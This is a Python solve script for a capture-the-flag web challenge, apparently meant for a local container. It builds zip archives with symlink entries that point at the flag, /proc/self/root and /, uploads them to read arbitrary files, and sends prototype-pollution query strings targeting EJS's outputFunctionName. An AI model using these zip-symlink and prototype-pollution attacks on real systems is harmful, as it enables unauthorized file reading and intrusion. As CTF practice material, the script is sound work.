#!/usr/bin/env python3
"""Local-only experiments (we KNOW the flag name here) to isolate the two walls:
grey-filter + random-name + listing. Plus a prototype-pollution probe.

Run against the local container only.
Usage: uv run python solve/local_tests.py http://127.0.0.1:34267/ /flag-<name>.txt
"""
import io
import sys
import zipfile

import requests


def _zi(name, symlink):
    zi = zipfile.ZipInfo(name)
    zi.create_system = 3
    zi.external_attr = ((0o120777 if symlink else 0o100644) & 0xFFFF) << 16
    return zi


def build(entries):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as z:
        for kind, name, data in entries:
            z.writestr(_zi(name, kind == "sym"), data)
    return buf.getvalue()


def up(base, blob, fn="z.zip"):
    r = requests.post(f"{base}/upload", files={"photos": (fn, blob, "application/zip")},
                      allow_redirects=False, timeout=30)
    return r.status_code, r.headers.get("location", "")


def g(base, path, **kw):
    return requests.get(f"{base}{path}", timeout=30, allow_redirects=False, **kw)


def main():
    base = sys.argv[1].rstrip("/")
    flag = sys.argv[2] if len(sys.argv) > 2 else "/flag.txt"
    print(f"base={base} flag={flag}\n")

    # ---- T1 prototype pollution probe ----
    print("== T1 proto-pollution (does GET / break after polluting outputFunctionName?) ==")
    base_status = g(base, "/").status_code
    print(f"  baseline GET / = {base_status}")
    for q in ["__proto__[outputFunctionName]=bad-id",
              "__proto__%5BoutputFunctionName%5D=bad-id",
              "constructor[prototype][outputFunctionName]=bad-id"]:
        g(base, f"/?{q}")
        s = g(base, "/").status_code
        print(f"  after ?{q}  -> GET / = {s}  {'<<< POLLUTED!' if s == 500 else ''}")

    # ---- setup symlinks: v->../views (a1 reads) and uploads symlinks (/photos) ----
    print("\n== setup symlinks ==")
    print("  stage1:", up(base, build([("sym", "v", "../views")])))
    entries = [
        ("sym", "v/rflag.ejs", flag),                 # a1 read of flag (grey)
        ("sym", "v/rflagslash.ejs", flag + "/"),      # trailing slash trick
        ("sym", "v/rflagroot.ejs", "/proc/self/root" + flag),  # via /proc/self/root
        ("sym", "fimg.png", flag),                    # /photos read of flag (magic)
        ("sym", "rootdir.png", "/"),                  # /photos+gallery listing attempt
    ]
    print("  stage2:", up(base, build(entries)))

    print("\n== T2 a1 read of KNOWN flag (expect 500 grey) ==")
    for p in ["/rflag", "/rflagslash", "/rflagroot"]:
        r = g(base, p)
        print(f"  GET {p} -> [{r.status_code}] {r.content[:80]!r}")

    print("\n== T3 /photos read of KNOWN flag (expect 415 magic) ==")
    r = g(base, "/photos/fimg.png")
    print(f"  GET /photos/fimg.png -> [{r.status_code}] {r.content[:80]!r}")

    print("\n== T4 listing attempt: gallery after uploads/rootdir.png -> / ==")
    r = g(base, "/")
    import re
    names = re.findall(r'alt="([^"]+)"', r.text)
    print(f"  gallery alt= names: {names[:30]}")
    # also try /photos/rootdir.png/<known sub>
    r2 = g(base, "/photos/rootdir.png/etc/hostname")
    print(f"  GET /photos/rootdir.png/etc/hostname -> [{r2.status_code}] (ext gate?) {r2.content[:60]!r}")

    print("\n== T5 can a1 read flag if we strip grey? (sanity: read /etc/hostname via same mech) ==")
    print("  (control already proven in probe_live: /etc/passwd readable)")


if __name__ == "__main__":
    main()
